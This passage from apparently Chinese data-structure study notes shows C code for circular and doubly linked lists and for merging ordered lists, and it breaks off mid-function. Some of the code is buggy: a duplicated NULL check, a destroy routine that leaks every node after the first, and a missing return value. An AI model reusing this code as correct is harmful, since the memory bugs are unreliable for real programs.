class="hljs-keyword">define</span> ElemType char</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *circularLinkList;<br><br>circularLinkList <span class="hljs-title function_">initList</span><span class="hljs-params">(circularLinkList *headNode)</span>;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(circularLinkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(circularLinkList headNode)</span>;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(circularLinkList tailNode1, circularLinkList tailNode2)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    circularLinkList headNode1 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList headNode2 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList tailNode1 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList tailNode2 = <span class="hljs-literal">NULL</span>;<br>    tailNode1 = initList(&amp;headNode1);<br>    tailNode2 = initList(&amp;headNode2);<br>    printfList(headNode1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    combineList(tailNode1,tailNode2);<br>    printfList(headNode1);<br>    destroyList(headNode1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//将链表2接在链表一的后面，且保留链表一的头节点</span><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(circularLinkList tailNode1, circularLinkList tailNode2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (tailNode1 == <span class="hljs-literal">NULL</span> || tailNode1 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = tailNode1-&gt;next;<br>    tailNode1-&gt;next = tailNode2-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(tailNode2-&gt;next);<br>    tailNode2-&gt;next=<span class="hljs-literal">NULL</span>;<br>    tailNode2-&gt;next = temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(circularLinkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(circularLinkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(headNode);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>circularLinkList <span class="hljs-title function_">initList</span><span class="hljs-params">(circularLinkList *headNode)</span> &#123;<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-type">char</span> a;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;a);<br>    getchar();<br>    node *moveNode = (*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;date = a + i;<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        moveNode-&gt;next = temNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next = (*headNode);<br>    <span class="hljs-keyword">return</span> moveNode;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><ol><li><p>代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prior</span>;</span><br>&#125; node, *linkList;<br><br><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, ElemType data, <span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    temNode-&gt;data = data;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (--sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next-&gt;prior = temNode;<br>    temNode-&gt;next = moveNode-&gt;next;<br>    temNode-&gt;prior = moveNode;<br>    moveNode-&gt;next = moveNode-&gt;next-&gt;prior;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getLinkLength</span><span class="hljs-params">(linkList headNode)</span>&#123;<br>    <span class="hljs-keyword">if</span>(headNode==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>    node* moveNode=headNode-&gt;next;<br>    <span class="hljs-keyword">while</span>(moveNode!=headNode)&#123;<br>        moveNode=moveNode-&gt;next;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><br><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &lt; <span class="hljs-number">1</span>||sub%getLinkLength(headNode)==<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;deleteNode ERROR\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (--sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next-&gt;prior = moveNode-&gt;prior;<br>    moveNode-&gt;prior-&gt;next = moveNode-&gt;next;<br>    <span class="hljs-built_in">free</span>(moveNode);<br>    moveNode=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">insertLink</span><span class="hljs-params">(linkList headNode, linkList insertHeadNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || insertHeadNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = headNode;<br>    headNode-&gt;prior-&gt;next = insertHeadNode-&gt;next;<br>    insertHeadNode-&gt;next-&gt;prior = headNode-&gt;prior;<br>    headNode-&gt;prior = insertHeadNode-&gt;prior;<br>    headNode-&gt;prior-&gt;next = headNode;<br>    <span class="hljs-built_in">free</span>(insertHeadNode);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">destroyLink</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    node *deleteNode = moveNode;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, num);<br>    headNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">initLinkList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span> ((*headNode) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">char</span> a;<br>    (*headNode)-&gt;data = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;prior = <span class="hljs-literal">NULL</span>;<br>    node *moveNode = (*headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;a);<br>    getchar();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;data = a + i;<br>        moveNode-&gt;next = temNode;<br>        moveNode-&gt;next-&gt;prior = moveNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next = (*headNode);<br>    moveNode-&gt;next-&gt;prior = moveNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">printNodeACW</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;prior;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;data);<br>        moveNode = moveNode-&gt;prior;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">printNodeCW</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;data);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode;<br>    linkList headNode2;<br>    initLinkList(&amp;headNode);<br>    initLinkList(&amp;headNode2);<br>    printNodeCW(headNode);<br>    printNodeACW(headNode);<br><br>    insertLink(headNode, headNode2);<br>    printNodeCW(headNode);<br><br>    insertNode(headNode, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-number">54</span>);<br>    printNodeCW(headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, getLinkLength(headNode));<br><br>    deleteNode(headNode,<span class="hljs-number">55</span>);<br>    printNodeCW(headNode);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, getLinkLength(headNode));<br><br>    destroyLink(headNode);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="不同链表的比较"><a href="#不同链表的比较" class="headerlink" title="不同链表的比较"></a>不同链表的比较</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%A4%9A%E7%A7%8D%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="多种链表的比较"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8%E7%9A%84%E4%BC%98%E7%82%B9.png" alt="链式存储的优点"></p><p>  <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png"></p></li></ol><h3 id="线性表的应用"><a href="#线性表的应用" class="headerlink" title="线性表的应用"></a>线性表的应用</h3><ol><li><p>有序表的合并</p><ul><li><p>线性表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; headNode-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d &quot;</span>, headNode-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br><br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;length = num;<br>    (*headNode)-&gt;elem = (ElemType *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(ElemType) * num);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*headNode)-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(linkList *headNode1, linkList headNode2)</span> &#123;<br>    <span class="hljs-type">int</span> subLa = <span class="hljs-number">0</span>, subLb = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> l1 = (*headNode1)-&gt;length, l2 = headNode2-&gt;length;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    ElemType *temC = (<span class="hljs-type">int</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * (l1 + l2));<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; subLa &lt; l1 &amp;&amp; subLb &lt; l2; ++i) &#123;<br>        temC[i] = (*headNode1)-&gt;elem[subLa] &lt; headNode2-&gt;elem[subLb] ? (*headNode1)-&gt;elem[subLa++]<br>                                                                     : headNode2-&gt;elem[subLb++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (i &lt; l1 + l2) &#123;<br>        *(temC + i) = subLb &lt; l2 ? (headNode2)-&gt;elem[subLb++] : (*headNode1)-&gt;elem[subLa++];<br>        i++;<br>    &#125;<br>    (*headNode1)-&gt;elem = temC;<br>    (*headNode1)-&gt;length = l1 + l2;<br><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">destroyLink</span><span class="hljs-params">(linkList pDel)</span> &#123;<br>    <span class="hljs-keyword">if</span> (pDel == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(pDel-&gt;elem);<br>    <span class="hljs-built_in">free</span>(pDel);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode1 = <span class="hljs-literal">NULL</span>;<br>    linkList headNode2 = <span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode1);<br>    initList(&amp;headNode2);<br>    combineList(&amp;headNode1, headNode2);<br>    printfList(headNode1);<br>    destroyLink(headNode1);<br>    destroyLink(headNode2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType elem;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br><br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;elem = <span class="hljs-number">0</span>;<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<br>    node *moveNode = (*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;temNode-&gt;elem);<br>        moveNode-&gt;next = temNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> 